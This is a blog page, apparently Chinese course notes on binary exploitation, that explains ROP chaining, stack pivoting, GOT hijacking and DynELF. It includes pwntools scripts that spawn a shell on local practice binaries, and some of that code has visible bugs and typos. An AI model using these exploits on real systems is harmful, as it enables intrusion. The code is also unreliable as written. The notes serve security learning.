@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="ROP实战技巧之一：连接多个libc函数调用 ROPP实战技巧之二：栈迁移(Stack Pivot) ROP案例详解 x64下的ROP ROP和GOT表劫持相关缓解技术  回顾：栈布局 回顾：Return to Libc一次在栈上布置system、exit、binsh、0，即可连续调用system(“/bin/sh”)和exit(0)  那如何串联3次或更多的libc函数调用？如果libc函数有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长亭PWN笔记02">
+<meta property="og:url" content="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟02/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="ROP实战技巧之一：连接多个libc函数调用 ROPP实战技巧之二：栈迁移(Stack Pivot) ROP案例详解 x64下的ROP ROP和GOT表劫持相关缓解技术  回顾：栈布局 回顾：Return to Libc一次在栈上布置system、exit、binsh、0，即可连续调用system(“/bin/sh”)和exit(0)  那如何串联3次或更多的libc函数调用？如果libc函数有">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163406.png">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163511.png">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164655.png">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164912.png">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426165102.png">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426112159.png">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426135345.png">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426141137.png">
+<meta property="og:updated_time" content="2020-04-27T02:56:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="长亭PWN笔记02">
+<meta name="twitter:description" content="ROP实战技巧之一：连接多个libc函数调用 ROPP实战技巧之二：栈迁移(Stack Pivot) ROP案例详解 x64下的ROP ROP和GOT表劫持相关缓解技术  回顾：栈布局 回顾：Return to Libc一次在栈上布置system、exit、binsh、0，即可连续调用system(“/bin/sh”)和exit(0)  那如何串联3次或更多的libc函数调用？如果libc函数有">
+<meta name="twitter:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163406.png">
+  <link rel="canonical" href="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟02/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>长亭PWN笔记02 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟02/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">长亭PWN笔记02
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2020-04-26 01:55:21 / Geändert am: 19:56:40" itemprop="dateCreated datePublished" datetime="2020-04-26T01:55:21-07:00">2020-04-26</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/长亭PWN笔记/" itemprop="url" rel="index"><span itemprop="name">长亭PWN笔记</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li>ROP实战技巧之一：连接多个libc函数调用</li>
+<li>ROPP实战技巧之二：栈迁移(Stack Pivot)</li>
+<li>ROP案例详解</li>
+<li>x64下的ROP</li>
+<li>ROP和GOT表劫持相关缓解技术</li>
+</ul>
+<h2 id="回顾：栈布局"><a href="#回顾：栈布局" class="headerlink" title="回顾：栈布局"></a>回顾：栈布局</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163406.png" alt></p>
+<h2 id="回顾：Return-to-Libc"><a href="#回顾：Return-to-Libc" class="headerlink" title="回顾：Return to Libc"></a>回顾：Return to Libc</h2><p>一次在栈上布置system、exit、binsh、0，即可连续调用system(“/bin/sh”)和exit(0)</p>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426163511.png" alt></p>
+<p>那如何串联3次或更多的libc函数调用？如果libc函数有2个以上的参数，如何不是ROP Payload？例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(fd,buf,size)</span><br><span class="line">write(fd,buf,size)</span><br></pre></td></tr></table></figure>
+
+<p>DEMO代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">"./ret2libc"</span>)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">"This is your gift: "</span>)</span><br><span class="line">setvbuf_addr = int(io.recvline().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc.sym就是offset</span></span><br><span class="line">libc_base = setvbuf_addr - libc.sym[<span class="string">"setvbuf"</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">log.info(<span class="string">"setvbuf_addr:0x%x"</span>) % setvbuf_addr)</span><br><span class="line">log.info(<span class="string">"libc_base:0x%x"</span>) % libc_base)</span><br><span class="line">log.info(<span class="string">"system_addr:0x%x"</span>) % system_addr)</span><br><span class="line">log.info(<span class="string">"binsh_addr:0x%x"</span>) % binsh_addr)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"A"</span>*<span class="number">0x68</span> + <span class="string">"B"</span>*<span class="number">4</span></span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += <span class="string">'CCCC'</span></span><br><span class="line">pay += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="连接多个libc函数调用"><a href="#连接多个libc函数调用" class="headerlink" title="连接多个libc函数调用"></a>连接多个libc函数调用</h2><p>例如要连接<code>read(fd1,buf1,size1)</code>和<code>write(fd2,buf2,size2)</code>两个函数调用，无法按照<code>system(&quot;/bin/sh&quot;)</code>和<code>exit(0)</code>那样布置ROP Payload，参数会产生重叠</p>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164655.png" alt></p>
+<p>使用<code>pop ret</code>这类的ROP Gadget可以解决这个问题，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ebx ; pop esi ; pop edi ; ret ;</span><br></pre></td></tr></table></figure>
+
+<p>这种三个的gadget下文记为<strong>pop3 ret</strong></p>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426164912.png" alt></p>
+<h4 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426165102.png" alt></p>
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><ul>
+<li>定义<ul>
+<li>通过一个修改esp寄存器的gadget来改变栈的位置</li>
+</ul>
+</li>
+<li>应用场景<ul>
+<li>溢出长度较短，不够做ROP（例1）</li>
+<li>溢出载荷以0结尾，而gadget地址为0开头（例2）</li>
+<li>在泄露地址后，我们需要执行一个新的ROP链</li>
+</ul>
+</li>
+</ul>
+<p>例1：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vodi <span class="title">stack_overflow</span><span class="params">(<span class="keyword">char</span> *user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> dst[<span class="number">512</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(user)&gt;<span class="number">536</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//536-512 = 24 字节的溢出，太短！</span></span><br><span class="line">    <span class="built_in">strcpy</span>(dst,user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例2：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vodi <span class="title">stack_overflow</span><span class="params">(<span class="keyword">char</span> *user)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dst[<span class="number">512</span>]</span><br><span class="line">    <span class="built_in">strcpy</span>(dst,user);</span><br><span class="line">&#125;</span><br><span class="line">x64 assembly</span><br><span class="line"><span class="number">0x406113</span>:	<span class="number">55</span>			push	%rbp</span><br><span class="line"><span class="number">0x406114</span>:	<span class="number">41</span> <span class="number">89</span> d4	mov		%edx,%e12d</span><br></pre></td></tr></table></figure>
+
+<h3 id="add-esp"><a href="#add-esp" class="headerlink" title="add esp"></a>add esp</h3><p>将esp加上一个固定值的gadget我们称为“add esp”，例如：add esp，0x6c;ret;</p>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426112159.png" alt></p>
+<h3 id="pop-ebp-ret-leave-ret"><a href="#pop-ebp-ret-leave-ret" class="headerlink" title="pop ebp ret + leave ret"></a>pop ebp ret + leave ret</h3><ul>
+<li><code>pop ebp;ret;</code> + <code>leavel;ret;</code>两个gadget组合可以将esp改成任意值</li>
+<li><code>pop ebp;ret;</code>可以将ebp改为任意值</li>
+<li><code>leave = mov esp,ebp;pop ebp</code>因此ebp会存入esp，esp可以任意控制</li>
+</ul>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
+<li>第一次ROP，泄露libc地址<ul>
+<li>调用<code>write(1,write_got,4)</code>，泄露write函数地址，同方法1</li>
+<li>调用read(0,new_stack,ROP_len)，读取第二次ROP Payload到BSS段（新的栈）</li>
+<li>利用栈迁移<code>pop ebp ret</code>+<code>leave ret</code>，连接执行第二次ROP</li>
+<li>等待栈迁移触发第二次ROP执行，启动shell    </li>
+</ul>
+</li>
+</ul>
+<h2 id="GOT表劫持"><a href="#GOT表劫持" class="headerlink" title="GOT表劫持"></a>GOT表劫持</h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426135345.png" alt></p>
+<ul>
+<li>上述方法中，我们需要执行两次ROP，第二次ROP Payload依赖第一次ROP泄露的地址，能否只用一次ROP就完成利用？</li>
+<li>在ROP中通过Return To PLT调用read和write，实际上可以实现内存任意读写</li>
+<li>因此，为了最终执行system()我们可以不使用ROP，而是使用GOT表劫持的方法：先通过ROP调用read，来修改wrtie函数的GOT表项，然后再次调用write，实际上此时调用的则是GOT表项被劫持后的值，例如system()</li>
+</ul>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80%EF%BC%8C%E5%AE%9E%E6%88%98ROP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/QQ%E5%9B%BE%E7%89%8720200426141137.png" alt></p>
+<h4 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h4><ul>
+<li>使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入<ul>
+<li>调用write(1,write_got,4)，泄露write函数地址</li>
+<li>调用read()，修改write()函数的GOT表项为system地址</li>
+<li>调用read(0,bss,len(cmd))，将命令字符串(“/bin/sh”)写入.bss Section</li>
+<li>调用write(cmd)，实际上调用的system(cmd)</li>
+</ul>
+</li>
+<li>读取泄露的write函数地址，计算system()地址</li>
+<li>输入system()地址，修改write()函数的GOT表项</li>
+<li>输入命令字符串”/bin/sh”，写入.bss Section</li>
+<li>调用write(cmd)来运行system(cmd)</li>
+</ul>
+<h2 id="如果题目没有给予libc怎么办"><a href="#如果题目没有给予libc怎么办" class="headerlink" title="如果题目没有给予libc怎么办"></a>如果题目没有给予libc怎么办</h2><ul>
+<li><p>从寻找我们需要的<a href="gttps://libc.blukat.me/" target="_blank" rel="noopener">libc_base</a></p>
+</li>
+<li><p>使用DynELF</p>
+</li>
+</ul>
+<h4 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h4><ul>
+<li>原理：如果可以实现任意内存读，可以模拟<code>_dll_runtime_resolve</code>函数的行为来解析符号，这样的好处是无需知道libc。pwntools库中的DynELF模块已经实现了此功能</li>
+<li>编写一个通用的任意内存泄露函数<ul>
+<li>通过返回main()函数来允许内存泄露触发多次</li>
+</ul>
+</li>
+<li>将泄露函数传入DynELF来解析system()函数的地址</li>
+<li>通过ROP来调用system(“/bin/sh”)</li>
+<li>当目标的libc库未知时，DynELF非常有用</li>
+</ul>
+<p>DEMO展示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,endian=<span class="string">'little'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">main = <span class="number">0x80481D</span></span><br><span class="line">bss = <span class="number">0x8049700</span></span><br><span class="line">elf = ELF(<span class="string">""</span>)</span><br><span class="line">p = process(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] PID: %s"</span> % proc.pidof(p)</span><br><span class="line">log.info(<span class="string">"[+] system: %s"</span> % hex(system))</span><br><span class="line"><span class="comment">#将栈溢出封装成ROP调用，方便多次触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rop</span><span class="params">(rop)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload)</span><br><span class="line"><span class="comment">#任意内存读函数，通过ROP调用write函数将任意地址内存读出，最后回到main，实现反复触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peek</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    rop = p32(elf.plt[<span class="string">'write'</span>]) + p32(main) + p32(<span class="number">1</span>) + p32(add) + p32(<span class="number">4</span>)</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#任意内存写函数，通过ROP调用write函数将任意地址内存写入，最后回到main，实现反复触发</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poke</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>)</span><br><span class="line">    rop = p32(elf.plt[<span class="string">'read'</span>]) + p32(main) + p32(<span class="number">0</span>) + p32(add) + p32(len(data))</span><br><span class="line">    payload += rop</span><br><span class="line">    p.send(payload) </span><br><span class="line">    p.send(data)</span><br><span class="line"><span class="comment">#将任意内存泄露函数peek传入DynELF</span></span><br><span class="line">d = DynELF(peek,elf=elf)</span><br><span class="line"><span class="comment">#DynELF模块可以实现任意库中的任意符号解析，例如system</span></span><br><span class="line">system = d.lookup(<span class="string">"system"</span>,<span class="string">"libc.so"</span>)</span><br><span class="line">log.info(<span class="string">"[+] system: %s"</span> % hex(system))</span><br><span class="line"><span class="comment">#将要执行的命令写入.bss Section</span></span><br><span class="line">poke(bss,<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"><span class="comment">#通过ROP运行system(cmd)</span></span><br><span class="line">do_rop(p32(system) + p32(<span class="number">0xDEADBEEF</span>) + p32(bss))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="x64架构下的ROP"><a href="#x64架构下的ROP" class="headerlink" title="x64架构下的ROP"></a>x64架构下的ROP</h2><ul>
+<li>amd64（64位）cdecl调用约定<ul>
+<li>使用寄存器rdi、rsi、rdx、rcx、r8、r9来传递前6个参数</li>
+<li>第七个及以上的参数通过栈来传递</li>
+</ul>
+</li>
+<li>参数在寄存器中，必须用gadget来设置参数<ul>
+<li>pop rdi ; ret </li>
+<li>pop rsi ; pop r15 ; ret ;</li>
+<li>用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget</li>
+</ul>
+</li>
+</ul>
